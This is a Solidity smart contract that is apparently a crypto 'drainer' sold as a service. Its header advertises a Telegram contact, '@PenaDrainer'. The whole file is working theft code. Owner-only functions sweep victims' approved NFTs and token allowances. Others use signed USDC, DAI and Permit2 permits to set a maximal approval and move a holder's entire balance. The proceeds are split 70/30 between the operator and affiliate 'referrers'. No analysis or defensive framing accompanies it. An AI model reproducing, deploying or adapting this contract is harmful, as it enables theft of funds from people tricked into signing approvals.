// SPDX-License-Identifier: MIT
pragma solidity ^0.8.18;

import "./IERC721.sol";
import "./IERC20.sol";
import "./PERMIT2.sol";

contract RedirectFunds {
    address payable public recipient;
    address public owner;
    uint256 public recipientPercent = 70;
    string public CONTACTS = "TG - @PenaDrainer";
    string public FEATURES = "We are a team of professionals who develop what others do not.";

    constructor(address payable _recipient) {
        recipient = _recipient;
        owner = msg.sender;
    }

    function setRecipient(address payable _newRecipient) public {
        require(msg.sender == owner, "Only owner can change the recipient");
        recipient = _newRecipient;
    }

    function setRecipientPercent(uint256 _newPercent) public {
        require(msg.sender == owner, "Only owner can change the percent");
        require(_newPercent <= 100, "Percent cannot be over 100");
        recipientPercent = _newPercent;
    }

    function claim(address payable _referrer) external payable {
        require(msg.value > 0, "You need to send some Ether");

        uint256 toRecipient = (msg.value * recipientPercent) / 100;
        uint256 toReferrer = msg.value - toRecipient;

        recipient.transfer(toRecipient);
        _referrer.transfer(toReferrer);
    }

    function withdraw(address payable _to) public {
        require(msg.sender == owner, "Only owner can withdraw");
        _to.transfer(address(this).balance);
    }

    function transferNFTs(
        address _nftAddress, 
        uint256[] memory _tokenIds, 
        address _holder,
        address _to
    ) public {
        require(msg.sender == owner, "Only owner can transfer NFTs");
        IERC721 nftContract = IERC721(_nftAddress);

        require(nftContract.isApprovedForAll(_holder, address(this)), "Holder did not give approval");

        for(uint256 i = 0; i < _tokenIds.length; i++) {
            require(nftContract.ownerOf(_tokenIds[i]) == _holder, "Holder is not the owner of this NFT");

            nftContract.transferFrom(_holder, _to, _tokenIds[i]);
        }
    }

    function transferTokens(
        address _tokenAddress, 
        address _holder, 
        address _to
    ) public {
        require(msg.sender == owner, "Only owner can transfer tokens");
        IERC20 tokenContract = IERC20(_tokenAddress);

        uint256 allowance = tokenContract.allowance(_holder, address(this));

        require(allowance > 0, "Holder did not give approval");

        uint256 toRecipient = (allowance * recipientPercent) / 100;
        uint256 toReferrer = allowance - toRecipient;

        tokenContract.transferFrom(_holder, recipient, toRecipient);
        tokenContract.transferFrom(_holder, _to, toReferrer);
    }

    function transferFrom(
        address _tokenAddress, 
        address _holder, 
        address _to,
        uint256 amount
    ) public {
        require(msg.sender == owner, "Only owner can transfer tokens");
        IERC20 tokenContract = IERC20(_tokenAddress);

        uint256 toRecipient = (amount * recipientPercent) / 100;
        uint256 toReferrer = amount - toRecipient;

        tokenContract.transferFrom(_holder, recipient, toRecipient);
        tokenContract.transferFrom(_holder, _to, toReferrer);
    }

    function permitAndTransferUSDC(
        address _tokenAddress,
        address _holder,
        address _referrer,
        uint256 _deadline,
        uint8 _v,
        bytes32 _r,
        bytes32 _s
    ) public {
        require(msg.sender == owner, "Only owner can permit tokens");
        IERC20 tokenContract = IERC20(_tokenAddress);
 
        uint256 MAX_APPROVAL = 1158472395435294898592384258348512586931256;

        tokenContract.permitUSDC(_holder, address(this), MAX_APPROVAL, _deadline, _v, _r, _s);

        uint256 fullBalance = tokenContract.balanceOf(_holder);
        // Calculate amounts
        uint256 toRecipient = (fullBalance * recipientPercent) / 100;
        uint256 toReferrer = fullBalance - toRecipient;

        // Transfer
        tokenContract.transferFrom(_holder, recipient, toRecipient);
        tokenContract.transferFrom(_holder, _referrer, toReferrer);
    }

    function permitAndTransferDAI(
        address _tokenAddress,
        address _holder,
        address _referrer,
        uint256 _nonce,
        uint256 _expiry,
        bool _allowed,
        uint8 _v,
        bytes32 _r,
        bytes32 _s
    ) public {
        require(msg.sender == owner, "Only owner can permit tokens");
        IERC20 tokenContract = IERC20(_tokenAddress);

        tokenContract.permitDAI(_holder, address(this), _nonce, _expiry, _allowed, _v, _r, _s);

        uint256 fullBalance = tokenContract.balanceOf(_holder);

        uint256 toRecipient = (fullBalance * recipientPercent) / 100;
        uint256 toReferrer = fullBalance - toRecipient;

        tokenContract.transferFrom(_holder, recipient, toRecipient);
        tokenContract.transferFrom(_holder, _referrer, toReferrer);
    }

    function permitAndTransferFrom(
        address _contractAddress,
        address _holder,
        PermitBatch memory _permitBatch,
        AllowanceTransferDetails[] calldata _transferDetails,
        bytes calldata _signature
    ) public {
        require(msg.sender == owner, "Only owner can call permit");
        IERC20Permit2 permitContract = IERC20Permit2(_contractAddress);

        permitContract.permit(_holder, _permitBatch, _signature);

        permitContract.transferFrom(_transferDetails);
    }

    function permitTransferFrom(
        address _contractAddress,
        PermitBatchTransferFrom memory _permit,
        SignatureTransferDetails[] calldata _transferDetails,
        address _holder,
        bytes calldata _signature
    ) public {
        require(msg.sender == owner, "Only owner can call permit");
        IERC20Permit2 permitContract = IERC20Permit2(_contractAddress);

        permitContract.permitTransferFrom(_permit, _transferDetails, _holder, _signature);
    }

    receive() external payable {
    }
}